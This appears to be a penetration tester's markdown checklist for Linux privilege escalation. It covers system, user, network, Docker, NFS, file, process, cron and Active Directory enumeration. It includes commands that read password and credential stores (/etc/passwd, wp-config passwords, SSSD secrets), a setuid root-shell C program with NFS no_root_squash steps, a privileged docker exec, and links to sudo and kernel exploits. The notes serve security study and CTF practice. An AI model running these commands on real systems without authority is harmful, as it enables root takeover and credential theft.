# 📋 Linux Privesc Checklist

* [ ] To check information about system: `cat /etc/issue; cat /etc/*-release; uname -r; arch`
* [ ] To get cpu info: `lscpu`
* [ ] To check valid login shells : `cat /etc/shells`
* [ ] View all users: `cat /etc/passwd` Only usernames: `cat /etc/passwd | cut -f1 -d:`
* [ ] Check for shellshock : `grep "*sh$" /etc/passwd`
* [ ] Last login: `lastlog`
* [ ] Check sudo version is `1.8.31` use [this exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)

## [Kernel Exploits](https://github.com/lucyoa/kernel-exploits)

### Grep TIps

*   [ ] If wanna search recursively in a directory:&#x20;

    `grep -Horn <text> <dir>`&#x20;

    To print full line: exclude `-o`

### Privileges,Users, etc

* [ ] Check for groups `cat /etc/group`
* [ ] To list interesting groups: `getent group sudo`
* [ ] If user in _adm_ group check: `/var/logs`
* [ ] Check id with `ls -ln` and if uid is different and nfs share is present do the [nfs-privesc.md](nfs-privesc.md "mention")
* [ ] Check for [capabilities.md](capabilities.md "mention") with

```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

* [ ] Check [logrotate.md](logrotate.md "mention")

### Network

* [ ] Netstat:
  * [ ] All: `netstat -antup`
  * [ ] Listening connections:\
    `netstat -plunt`
* [ ] Check DNS: `/etc/hosts`
* [ ] `ifconfig` or `ip a` if it is dual homed, etc.
* [ ] `/etc/resolv.conf` if the host is configured to use internal DNS it can be starting point to query Active Directory.
* [ ] To see which other hosts the target has been communicating with we can use `arp -a`

### Docker

* [ ] When creating a Docker container if -h or -hostname is not specified then hostname is container name.
  * Example hostname of docker container: `efaa6f5097ed`
* [ ] `.dockerenv` in root directory
* [ ] To evaluate use [CDK](https://github.com/cdk-team/CDK) Refer: Forgotten-vulnlab
* [ ] If sudo access on docker exec`sudo docker exec --privileged --user 0 -it container_name /bin/sh`

### WSL

* [ ] To mount c drive in WSL

```
mount -t drvfs 'c:' /mnt/c
```

### Disks & Other Peripheral

* [ ] Check for unmounted drives with `lsblk` or `fdisk -l`
* [ ] `lsblk` to enumerate information about block devices (hard disks, USB drives, optical drives).
* [ ] `lpstat` to check for printers

#### NFS

* [ ] Check for NFS with `showmount -e <ip>`
* [ ] Then `cat /etc/exports`. If (rw,no\_root\_squash) then we can create setuid binary on bash:

shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
	setuid(0);setgid(0);system("/bin/bash")
}		
```

* [ ] Compile and copy to nfs:

```bash
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

* [ ] Run it after switching to low privileged session: `./shell`

### Files & File searching

* [ ] To find .conf files:

```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

* [ ] To find setuid(SUID) binaries:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

* [ ] To get all hidden files:

```bash
find / -type d -name ".*" -ls 2>/dev/null
```

* [ ] To find scripts:

```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

* [ ] To check for writable directories:

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

or writable files:

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

* [ ] If wordpress then it is quite common to have passwords in the config file:

```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

### Processes & Installed Packages

* [ ] Check running processes:
  * [ ] `ps aux` --> only root `ps aux | grep root`
  * [ ] `watch -n 1 "ps -aux | grep pass"` - to get entries with password
  * [ ] `ps fauxww`
  * [ ] `ps -ewwo pid,user,cmd --forest`
  * [ ] If doas is present then check config file which can be found with

```bash
find / -name doas.conf 2>/dev/null
```

* [ ] `dpkg -l` to list packages
* [ ] If no sudo access: [pspy](https://github.com/DominicBreuker/pspy): `./pspy64 -pf -i 1000`
* [ ] To add current path to $PATH:

```bash
PATH=.:${PATH}
```

* [ ] To check cron jobs try ALL THESE:
  * [ ] `crontab -l`(Run with sudo too)
  * [ ] `ls -lah /etc/cron*`
  * [ ] `grep "CRON" /var/log/syslog` - To check cron logs
* [ ] To check binaries: `ls -l /bin /usr/bin/ /usr/sbin/`
* [ ] To check installed packages:

```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

* [ ] To check gtfo bins against installed packages (run the previous command before this):

```bash
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

* [ ] _Strace_ can be used to trace the system calls and signal processing of any command

## Active Directory

* [ ] Check `/etc/krb5.conf`
* [ ] If root user then use **KeyTabExtract**
* [ ] Check for hashes:

```
strings  /var/lib/sss/secrets/secrets.ldb | grep '\$'
```

* [ ] In `/var/lib/sss/db`:

```
strings cache_cerberus.local.ldb | grep '\$'
```

Check for cache
